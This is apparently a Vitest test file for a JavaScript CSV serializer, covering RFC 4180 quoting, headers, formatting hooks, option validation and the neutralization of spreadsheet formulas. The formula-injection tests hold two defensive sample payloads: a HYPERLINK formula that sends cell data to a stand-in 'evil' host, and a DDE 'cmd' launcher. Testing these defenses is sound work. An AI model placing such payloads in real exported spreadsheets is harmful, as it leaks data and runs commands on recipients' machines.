// @vitest-environment node
// Tests (roadmap 19.4, spec 06 §2 item F96, §6) for CSV serialization: the RFC
// 4180 grammar, and the formula-injection default that is the reason this
// function has a security note.
//
// Pinned to node, like the other /table suites: "no DOM anywhere" is half of what
// makes this usable in a server render, and a future switch of the project
// default must not quietly prove the opposite.
import { describe, expect, it } from 'vitest';
import { tableCsv } from '../../../../../main/javascript/it/d4np/utils/table.js';

const COLUMNS = [{ key: 'id' }, { key: 'name' }];
const ROWS = [
  { id: 7, name: 'ada' },
  { id: 9, name: 'bob' },
];

describe('the grammar (RFC 4180)', () => {
  it('writes a header and CRLF-terminated rows', () => {
    expect(tableCsv(ROWS, { columns: COLUMNS })).toBe('id,name\r\n7,ada\r\n9,bob\r\n');
  });

  it('omits the header when asked', () => {
    expect(tableCsv(ROWS, { columns: COLUMNS, header: false })).toBe('7,ada\r\n9,bob\r\n');
  });

  it('writes just the header for no rows', () => {
    expect(tableCsv([], { columns: COLUMNS })).toBe('id,name\r\n');
    expect(tableCsv([], { columns: COLUMNS, header: false })).toBe('');
  });

  it('quotes only where the grammar requires it', () => {
    const rows = [{ a: 'plain' }, { a: 'has,comma' }, { a: 'has"quote' }, { a: 'has\nnewline' }];
    expect(tableCsv(rows, { columns: [{ key: 'a' }], header: false })).toBe(
      'plain\r\n"has,comma"\r\n"has""quote"\r\n"has\nnewline"\r\n',
    );
  });

  it('quotes a field with edge whitespace, where lenient and strict parsers disagree', () => {
    expect(tableCsv([{ a: ' padded ' }], { columns: [{ key: 'a' }], header: false })).toBe(
      '" padded "\r\n',
    );
  });

  it('takes a delimiter, and quotes against that delimiter rather than the comma', () => {
    const rows = [{ a: 'has,comma', b: 'has\ttab' }];
    expect(
      tableCsv(rows, { columns: [{ key: 'a' }, { key: 'b' }], header: false, delimiter: '\t' }),
    ).toBe('has,comma\t"has\ttab"\r\n');
  });

  it('takes LF as an option rather than leaving a caller to replace CRLF', () => {
    // The reason it is an option: `text.replace(/\r\n/g, '\n')` would also rewrite
    // the CRLFs INSIDE quoted fields, corrupting data while looking like
    // reformatting.
    const rows = [{ a: 'line1\r\nline2' }];
    expect(tableCsv(rows, { columns: [{ key: 'a' }], header: false, newline: '\n' })).toBe(
      '"line1\r\nline2"\n',
    );
  });

  it('renders nullish as an empty field, not as the word null', () => {
    const rows = [{ a: null, b: undefined }];
    expect(tableCsv(rows, { columns: [{ key: 'a' }, { key: 'b' }], header: false })).toBe(',\r\n');
  });

  it('tolerates a row missing a column entirely', () => {
    expect(tableCsv([{ id: 1 }], { columns: COLUMNS, header: false })).toBe('1,\r\n');
  });
});

describe('headers', () => {
  it('prefers header, then a string label, then the key', () => {
    const columns = [{ key: 'a', header: 'A!' }, { key: 'b', label: 'B!' }, { key: 'c' }];
    expect(tableCsv([], { columns })).toBe('A!,B!,c\r\n');
  });

  it('skips a label that is not a string rather than stringifying it', () => {
    // `bsTable`'s label is `Content` and may be a node; `[object Object]` as a
    // column heading is worse than the key.
    const columns = [
      { key: 'a', label: { nodeType: 1 } },
      { key: 'b', label: 42 },
    ];
    expect(tableCsv([], { columns })).toBe('a,b\r\n');
  });
});

describe('values', () => {
  it('reads getValue when a column has one', () => {
    const columns = [{ key: 'full', getValue: (row) => `${row.first} ${row.last}` }];
    expect(tableCsv([{ first: 'Ada', last: 'L' }], { columns, header: false })).toBe('Ada L\r\n');
  });

  it('formats through the column text hook', () => {
    const columns = [{ key: 'when', text: (value) => new Date(value).toISOString().slice(0, 10) }];
    expect(tableCsv([{ when: 0 }], { columns, header: false })).toBe('1970-01-01\r\n');
  });

  it('formats through a table-wide format, and the column hook wins', () => {
    const columns = [{ key: 'a' }, { key: 'b', text: () => 'column' }];
    expect(tableCsv([{ a: 1, b: 2 }], { columns, header: false, format: () => 'table' })).toBe(
      'table,column\r\n',
    );
  });

  it('coerces a formatter that returned something other than a string', () => {
    const columns = [
      { key: 'a', text: () => 42 },
      { key: 'b', text: () => null },
    ];
    expect(tableCsv([{}], { columns, header: false })).toBe('42,\r\n');
  });
});

describe('formula injection (the F96 security clause)', () => {
  it('neutralizes every risky leading character by default', () => {
    // `+1` is deliberately absent: it is a number, and the numeric exception
    // below is what keeps this mitigation from corrupting every signed column.
    const risky = ['=1+1', '+1+1', '@SUM(A1)', '\tx', '\rx'];
    for (const value of risky) {
      const csv = tableCsv([{ a: value }], { columns: [{ key: 'a' }], header: false });
      expect(csv.startsWith("'") || csv.startsWith('"\'')).toBe(true);
    }
  });

  it('defuses the classic exfiltration payload', () => {
    const payload = '=HYPERLINK("http://evil/?"&A1,"click")';
    expect(tableCsv([{ a: payload }], { columns: [{ key: 'a' }], header: false })).toBe(
      `"'${payload.replaceAll('"', '""')}"\r\n`,
    );
  });

  it('leaves a number alone, even though it starts with a risky character', () => {
    // The exception that makes the mitigation liveable: prefixing every negative
    // number would corrupt whole columns to buy nothing, and is how a security
    // default gets switched off wholesale.
    for (const value of ['-5', '+1', '+3.5', '-1e6', '-0', ' -5 ']) {
      expect(tableCsv([{ a: value }], { columns: [{ key: 'a' }], header: false })).not.toContain(
        "'",
      );
    }
    expect(tableCsv([{ a: -5 }], { columns: [{ key: 'a' }], header: false })).toBe('-5\r\n');
  });

  it('still neutralizes a payload that merely begins like a number', () => {
    for (const value of ["-2+3+cmd|' /C calc'!A0", '- 5', '-5=1', '+x']) {
      expect(tableCsv([{ a: value }], { columns: [{ key: 'a' }], header: false })).toContain("'");
    }
  });

  it('neutralizes a header too, since a label can come from data', () => {
    expect(tableCsv([], { columns: [{ key: 'a', header: '=1+1' }] })).toBe("'=1+1\r\n");
  });

  it('is defeatable, and the escape hatch actually disables it', () => {
    expect(
      tableCsv([{ a: '=1+1' }], {
        columns: [{ key: 'a' }],
        header: false,
        neutralizeFormulas: false,
      }),
    ).toBe('=1+1\r\n');
  });

  it('leaves a risky character that is not leading alone', () => {
    expect(tableCsv([{ a: 'a=1' }], { columns: [{ key: 'a' }], header: false })).toBe('a=1\r\n');
  });
});

describe('contract', () => {
  it('requires rows and columns', () => {
    expect(() => tableCsv('nope', { columns: COLUMNS })).toThrow(/rows must be an array/);
    expect(() => tableCsv([], null)).toThrow(/options must be an object with columns/);
    expect(() => tableCsv([], {})).toThrow(/options.columns must be a non-empty array/);
    expect(() => tableCsv([], { columns: [] })).toThrow(/non-empty array/);
  });

  it('rejects a malformed column', () => {
    expect(() => tableCsv([], { columns: [null] })).toThrow(/columns\[0\] must be an object/);
    expect(() => tableCsv([], { columns: [{}] })).toThrow(/columns\[0\].key must be a non-empty/);
    expect(() => tableCsv([], { columns: [{ key: 'a', text: 'x' }] })).toThrow(
      /columns\[0\].text must be a function/,
    );
    expect(() => tableCsv([], { columns: [{ key: 'a', getValue: 1 }] })).toThrow(
      /columns\[0\].getValue must be a function/,
    );
  });

  it('rejects a delimiter that already has a meaning in the grammar', () => {
    for (const bad of ['"', '\r', '\n']) {
      expect(() => tableCsv([], { columns: COLUMNS, delimiter: bad })).toThrow(
        /cannot be a quote or a line break/,
      );
    }
    expect(() => tableCsv([], { columns: COLUMNS, delimiter: ';;' })).toThrow(
      /must be a single character/,
    );
  });

  it('rejects other malformed options and unknown keys', () => {
    expect(() => tableCsv([], { columns: COLUMNS, newline: '\r' })).toThrow(/newline must be/);
    expect(() => tableCsv([], { columns: COLUMNS, header: 'yes' })).toThrow(
      /header must be a boolean/,
    );
    expect(() => tableCsv([], { columns: COLUMNS, neutralizeFormulas: 'no' })).toThrow(
      /neutralizeFormulas must be a boolean/,
    );
    expect(() => tableCsv([], { columns: COLUMNS, format: 'x' })).toThrow(
      /format must be a function/,
    );
    expect(() => tableCsv([], { columns: COLUMNS, headers: true })).toThrow(
      /unknown option 'headers'/,
    );
  });
});
